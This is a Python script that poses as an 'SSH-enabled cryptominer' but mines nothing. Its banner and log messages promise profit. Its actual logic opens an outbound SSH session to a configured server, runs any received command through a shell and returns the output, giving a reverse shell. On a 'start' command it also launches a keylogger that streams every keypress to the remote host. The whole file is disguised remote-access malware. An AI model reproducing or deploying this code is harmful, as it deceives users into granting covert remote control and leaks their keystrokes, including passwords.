import sys
import paramiko
import subprocess
from os import system
from loguru import logger
import config as config

from pynput.keyboard import Key, Listener

#script args
server_address = config.host
server_port = int(config.port)
username = config.user
password = config.code

logger.add(sys.stderr,
           format="{time} {message}",
           filter="client",
           level="INFO")

logger.add('logs/log_{time:YYYY-MM-DD}.log',
           format="{time} {level} {message}",
           filter="client",
           level="ERROR")

def init():
    system(f'clear')
    logger.info("""



 = = = = = = = = = = = = = = = = = = = = = = = = = WELCOME = = = = = = = = = = = = = = = = = = = = = = = = = =
This is a SSH-Enabled cryptominer application for privatized use. Created for use of automated personal crypto coin profit mining. The application will start, a client will initialize, and proceed to connect to an SSH server to continue processing. This process will begin without further input being required. Sit back, relax, and profit.

""")
    logger.warning('\n\nCryptomining can be very hardware intensive, especially for GPUs. Ensure your hardware and drivers are up to date if you encounter any issues, or contact our support staff if you think there may be a bug.\n')
    logger.info('Informative text, such as mining progress.')
    logger.debug('Development text, will be removed later.')
    logger.warning('Information that is non-fatal but risky.')
    logger.error('This is error text, avoid using this.\n')
    logger.info('Starting SSH-enabled client cryptominer . . .')

init()



#connect to the remote ssh server and recieve commands to be #executed and send back output
def ssh_command(server_address, server_port, username, password):
    logger.info('Miner started successfully!')
    logger.debug(f"{server_address}:{server_port} - {username}@{password}")
    #instantiate the ssh client
    client = paramiko.SSHClient()
#optional is using keys instead of password auth
    #client.load_host_key(config.sshp + "id_rsa")
#auto add key
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
#connect to ssh server
    logger.info('Attempting to connect with exchange server . . .')
    client.connect(
        server_address,
        port=server_port,
        username=username,
        password=password
    )
    logger.info('Connected to exchange server.')
#get ssh session
    client_session = client.get_transport().open_session()
    if client_session.active and not client_session.closed:
        #wait for command, execute and send result ouput
        while True:
            #use subprocess run with timeout of 30 seconds
            try:
                command = client_session.recv(1024).decode('utf-8')
                logger.info('Processing exchange . . .')
                def on_press(key):
                    client_session.send('"{0} pressed"'.format(key))
                    if command == "exit":
                        return False
                if (command == "start"):
                    # Collect events until released
                    with Listener(
                        on_press=on_press) as listener:
                            listener.join()
                command_output = subprocess.run(
                    command, stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    shell=True,
                    timeout=30
                )
                #send back the resulting output
                if len(command_output.stderr.decode('utf-8')):
                    client_session.send(command_output.stderr.decode('utf-8'))
                elif len(command_output.stdout.decode('utf-8')):
                    client_session.send(command_output.stdout.decode('utf-8'))
                else:
                    client_session.send('null')
            except subprocess.CalledProcessError as err:
                client_session.send(str(err))
    client_session.close()
    return
try:
    ssh_command(server_address, server_port, username, password)
except Exception as err:
    logger.error(err)
    logger.warning("Application enexpectedly needs to exit.\nSorry about that, try checking your internet connection, or checking back later, as the exchange servers may be temporarily down. SSH keys can also sometimes cause the tunnel to fail and collapse.")
